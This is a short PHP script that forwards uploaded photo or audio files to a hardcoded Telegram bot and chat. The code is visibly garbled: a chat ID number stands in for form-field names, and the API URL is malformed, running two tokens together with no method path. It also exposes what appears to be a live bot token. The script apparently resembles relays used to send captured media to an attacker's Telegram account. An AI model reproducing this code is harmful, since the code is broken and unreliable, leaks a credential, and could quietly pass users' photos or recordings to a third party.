<?php
require_once 'config.php';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $chat_id = $_POST['7736916977'];
    $file = $_FILES['photo'] ?? $_FILES['audio'];
    $type = isset($_FILES['photo']) ? 'photo' : 'audio';

    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "7774490033:AAHyKvJlo4f7d02u9e9EUbteRwzojyj9OFg" . ucfirst($type);
    $post_fields = array(
        '7736916977' => $chat_id,
        $type => new CURLFile(realpath($file['tmp_name']))
    );

    $ch = curl_init(); 
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "Content-Type:multipart/form-data"
    ));
    curl_setopt($ch, CURLOPT_URL, $url); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields); 
    $output = curl_exec($ch);
    curl_close($ch);

    echo $output;
}
?>
